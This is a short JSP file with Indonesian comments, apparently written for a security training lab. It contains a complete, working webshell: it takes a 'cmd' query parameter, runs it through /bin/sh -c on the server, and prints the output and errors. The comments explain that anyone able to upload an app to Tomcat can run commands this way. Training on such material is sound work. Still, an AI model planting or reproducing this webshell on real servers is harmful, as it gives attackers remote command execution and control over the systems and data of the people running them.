<%--
  Webshell latihan. Sengaja sederhana supaya isinya bisa dibaca peserta yang
  belum pernah menulis JSP.

  Cara kerjanya satu kalimat: Tomcat mengizinkan aplikasi yang diunggah
  menjalankan kode Java, dan kode Java bisa memanggil shell sistem. Jadi
  begitu seseorang bisa mengunggah aplikasi, dia bisa menjalankan perintah.
  Tidak ada celah keamanan yang dipakai di sini, cuma fitur yang jatuh ke
  tangan yang salah.

  Berkas ini hanya boleh dijalankan di dalam container lab ini.
--%>
<%@ page import="java.io.*" %>
<%@ page contentType="text/plain; charset=UTF-8" trimDirectiveWhitespaces="true" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd == null) {
        out.println("webshell siap. tambahkan ?cmd=id di akhir alamat.");
    } else {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        BufferedReader keluaran = new BufferedReader(new InputStreamReader(p.getInputStream()));
        BufferedReader galat = new BufferedReader(new InputStreamReader(p.getErrorStream()));
        String baris;
        while ((baris = keluaran.readLine()) != null) { out.println(baris); }
        while ((baris = galat.readLine()) != null) { out.println(baris); }
    }
%>
